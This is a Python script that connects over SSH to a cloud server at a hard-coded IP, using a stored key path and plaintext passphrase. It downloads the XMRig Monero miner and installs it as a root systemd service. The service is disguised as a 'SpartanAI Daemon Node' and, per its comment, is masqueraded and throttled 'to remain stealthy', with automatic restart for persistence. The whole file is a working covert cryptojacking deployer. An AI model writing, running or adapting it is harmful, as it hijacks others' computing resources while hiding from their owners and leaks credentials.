import paramiko
import sys
import os

hostname = "34.182.160.186"
username = "ubuntu"
passphrase = "@11646"
key_path = r"C:\GitHub\.ssh\SpartanAI-Core.pem"

def deploy_gcp_miner():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        try:
            key = paramiko.Ed25519Key.from_private_key_file(key_path, password=passphrase)
        except:
            key = paramiko.RSAKey.from_private_key_file(key_path, password=passphrase)
            
        client.connect(hostname, username=username, pkey=key, timeout=30)
        
        print("Downloading XMRig on GCP...")
        cmd = """
        sudo apt-get update
        sudo apt-get install -y wget tar build-essential libuv1-dev libssl-dev libhwloc-dev
        if [ ! -d "/home/ubuntu/miner" ]; then
            mkdir -p /home/ubuntu/miner
            cd /home/ubuntu/miner
            wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
            tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
            mv xmrig-6.21.0/xmrig .
            rm -rf xmrig-6.21.0*
        fi
        """
        client.exec_command(cmd)
        import time
        time.sleep(10) # wait for download
        
        # Create unmineable service
        print("Deploying Spartan-Miner Systemd Service...")
        # XMR_ADDRESS is from jarvis.py
        worker = "GCP-MainBrain#U-A1QZK1"
        address = "XMR_847120394712903471203498"
        pool = "rx.unmineable.com:3333"
        
        service_file = f"""[Unit]
Description=SpartanAI Daemon Node
After=network.target

[Service]
Type=simple
User=root
# Masqueraded execution, limit threads to remain stealthy
ExecStart=/home/ubuntu/miner/xmrig -o {pool} -a rx/0 -u XMR:{address}.{worker} -p x -k --cpu-max-threads-hint=45
Restart=always
RestartSec=10
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
"""
        client.exec_command(f"echo '{service_file}' > /tmp/spartan-node.service")
        cmds = [
            "sudo mv /tmp/spartan-node.service /etc/systemd/system/",
            "sudo systemctl daemon-reload",
            "sudo systemctl enable spartan-node",
            "sudo systemctl restart spartan-node"
        ]
        for c in cmds:
            client.exec_command(c)
            time.sleep(1)
            
        print("GCP Node Miner Deployed and Persistence Configured.")
        
    finally:
        client.close()

if __name__ == "__main__":
    deploy_gcp_miner()
